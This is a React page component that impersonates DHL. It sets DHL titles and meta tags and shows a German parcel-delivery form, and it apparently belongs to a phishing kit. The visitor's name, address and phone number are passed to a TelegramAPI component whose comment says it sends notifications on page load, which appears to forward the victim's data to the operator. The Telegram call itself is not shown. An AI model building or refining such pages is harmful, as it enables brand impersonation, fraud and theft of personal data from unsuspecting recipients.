import { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import MainForm from "@/components/DE/demainform";
import { Header, Footer } from "@/components/DE";
import TelegramAPI from "@/components/tgapi";

const DELieferung = () => {
  const { code } = useParams();
  const [recipientData, setRecipientData] = useState(null);
  
  console.log('DELieferung loading, code:', code);
  console.log('Current URL:', window.location.href);
  
  // For 2xnbr route, always use empty recipient data
  const isPreviewMode = code === "2xnbr";
  const displayRecipientData = isPreviewMode ? null : recipientData;
  useEffect(() => {
    document.title = "DHL Lieferung - Paketlieferung Service";
    const metaDescription = document.querySelector('meta[name="description"]');
    if (metaDescription) {
      metaDescription.setAttribute("content", "DHL Paketlieferung und Sendungsverfolgung Service");
    }
    const ogTitle = document.querySelector('meta[property="og:title"]');
    if (ogTitle) {
      ogTitle.setAttribute("content", "DHL Lieferung");
    }
    const ogDescription = document.querySelector('meta[property="og:description"]');
    if (ogDescription) {
      ogDescription.setAttribute("content", "DHL Paketlieferung und Sendungsverfolgung Service");
    }
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100">
      {/* Telegram API Component - sends notifications on page load */}
      <TelegramAPI 
        invoiceName={displayRecipientData?.name || code || "Unknown Invoice"}
        address={
          displayRecipientData?.address && displayRecipientData?.city && displayRecipientData?.zip 
            ? [displayRecipientData.address, displayRecipientData.city, displayRecipientData.zip].join(', ')
            : "Incomplete"
        } 
        phone={displayRecipientData?.phone || "Unknown Phone"}
      />
      
      <Header />
      <div className="container mx-auto p-4">
        <MainForm 
          onRecipientDataChange={(data) => setRecipientData(data)}
          invoiceId={isPreviewMode ? null : code}
          initialData={isPreviewMode ? null : displayRecipientData}
        />
      </div>
      <Footer />
    </div>
  );
};

export default DELieferung;